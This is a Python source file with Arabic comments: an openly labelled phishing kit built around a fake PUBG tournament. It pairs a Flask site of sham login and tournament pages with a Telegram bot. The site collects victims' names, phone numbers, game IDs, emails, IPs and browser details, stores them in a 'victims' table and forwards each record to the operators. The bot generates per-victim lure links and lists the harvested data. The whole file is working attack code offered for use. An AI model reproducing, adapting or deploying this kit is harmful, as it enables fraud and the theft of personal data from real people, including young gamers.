#!/usr/bin/env python3
# ============================================================
# بوت توليد روابط تصيد متكامل – نسخة بلاك
# ============================================================

import os
import json
import sqlite3
import secrets
import requests
from datetime import datetime
from flask import Flask, request, render_template, redirect, jsonify, make_response
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ========== الإعدادات ==========
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
ADMIN_IDS = [int(id.strip()) for id in os.environ.get("ADMIN_IDS", "").split(",") if id.strip()]
BASE_URL = os.environ.get("BASE_URL", "http://localhost:5000")

if not TELEGRAM_TOKEN:
    raise ValueError("TELEGRAM_TOKEN not set")

# ========== Flask ==========
app = Flask(__name__)

# ========== قاعدة البيانات ==========
DB_PATH = "data.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT UNIQUE,
        step TEXT,
        full_name TEXT,
        phone_code TEXT,
        phone_number TEXT,
        game_id TEXT,
        email TEXT,
        ip TEXT,
        user_agent TEXT,
        timestamp TEXT
    )''')
    conn.commit()
    conn.close()

def save_victim(session_id, step, full_name, phone_code, phone_number, game_id, email, ip, ua):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO victims 
                 (session_id, step, full_name, phone_code, phone_number, game_id, email, ip, user_agent, timestamp)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
              (session_id, step, full_name, phone_code, phone_number, game_id, email, ip, ua, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    # إرسال البيانات فوراً إلى التيليجرام
    try:
        bot = Bot(token=TELEGRAM_TOKEN)
        msg = (f"🎯 **بيانات جديدة!**\n"
               f"🆔 الجلسة: `{session_id}`\n"
               f"👤 الاسم: `{full_name}`\n"
               f"📞 الهاتف: `{phone_code}{phone_number}`\n"
               f"🎮 ID اللعبة: `{game_id}`\n"
               f"📧 البريد: `{email}`\n"
               f"🌐 IP: `{ip}`\n"
               f"📱 المتصفح: `{ua}`\n"
               f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}")
        for admin_id in ADMIN_IDS:
            bot.send_message(chat_id=admin_id, text=msg, parse_mode='Markdown')
    except Exception as e:
        print(f"[!] خطأ في الإرسال للتيليجرام: {e}")

def get_victims():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, session_id, step, full_name, phone_number, game_id, email, timestamp FROM victims ORDER BY id DESC")
    data = c.fetchall()
    conn.close()
    return data

# ========== دوال توليد الروابط ==========
def generate_session_id():
    return secrets.token_urlsafe(8)

# ========== الصفحات ==========
@app.route('/')
def home():
    return "🚀 البوت يعمل!"

@app.route('/health')
def health():
    return "OK", 200

@app.route('/p/<session_id>', methods=['GET', 'POST'])
def login_page(session_id):
    """الصفحة الأولى: تسجيل الدخول / إنشاء حساب"""
    if request.method == 'POST':
        # تسجيل دخول وهمي (لا نتحقق من شيء)
        return redirect(f'/t/{session_id}')
    
    return render_template('login.html', session_id=session_id)

@app.route('/t/<session_id>', methods=['GET', 'POST'])
def tournament_page(session_id):
    """الصفحة الثانية: بطولة ببجي المزيفة"""
    if request.method == 'POST':
        # استلام بيانات النموذج الأخير
        full_name = request.form.get('full_name', '').strip()
        phone_code = request.form.get('phone_code', '')
        phone_number = request.form.get('phone_number', '').strip()
        game_id = request.form.get('game_id', '').strip()
        email = request.form.get('email', '').strip()
        
        ip = request.remote_addr
        ua = request.headers.get('User-Agent', '')
        
        save_victim(session_id, 'completed', full_name, phone_code, phone_number, game_id, email, ip, ua)
        
        # صفحة شكر وهمية
        return render_template('thank_you.html')
    
    return render_template('tournament.html', session_id=session_id)

@app.route('/collect', methods=['POST'])
def collect():
    """نقطة لجمع البيانات عبر AJAX (اختياري)"""
    data = request.json
    session_id = data.get('session_id')
    full_name = data.get('full_name', '')
    phone_code = data.get('phone_code', '')
    phone_number = data.get('phone_number', '')
    game_id = data.get('game_id', '')
    email = data.get('email', '')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    save_victim(session_id, 'ajax', full_name, phone_code, phone_number, game_id, email, ip, ua)
    return jsonify({"status": "ok"})

# ========== بوت تيليجرام ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ غير مصرح لك.")
        return
    await update.message.reply_text(
        "🔥 **بوت تصيد ببجي v1.0**\n\n"
        "**الأوامر:**\n"
        "/link - إنشاء رابط تصيد جديد\n"
        "/list - عرض الضحايا\n"
        "/stats - إحصائيات",
        parse_mode='Markdown'
    )

async def generate_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    session_id = generate_session_id()
    link = f"{BASE_URL}/p/{session_id}"
    await update.message.reply_text(
        f"🔗 **رابط جديد**\n\n"
        f"🆔 الجلسة: `{session_id}`\n"
        f"🔗 الرابط: {link}\n\n"
        f"📤 شارك الرابط مع الضحية.",
        parse_mode='Markdown'
    )

async def list_victims(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    victims = get_victims()
    if not victims:
        await update.message.reply_text("📭 لا يوجد ضحايا.")
        return
    msg = "📋 **الضحايا:**\n\n"
    for v in victims[-10:]:  # آخر 10 ضحايا
        msg += f"🆔 `{v[0]}` | 👤 {v[3]} | 📞 {v[5]} | 🎮 {v[6]} | 📧 {v[7]} | 📅 {v[8]}\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    victims = get_victims()
    await update.message.reply_text(
        f"📊 **إحصائيات**\n\n"
        f"👤 إجمالي الضحايا: `{len(victims)}`",
        parse_mode='Markdown'
    )

# ========== تشغيل التطبيق ==========
if __name__ == "__main__":
    init_db()
    
    # تشغيل البوت
    app_bot = Application.builder().token(TELEGRAM_TOKEN).build()
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("link", generate_link))
    app_bot.add_handler(CommandHandler("list", list_victims))
    app_bot.add_handler(CommandHandler("stats", stats))
    
    import threading
    threading.Thread(target=app_bot.run_polling, daemon=True).start()
    
    # تشغيل الخادم
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)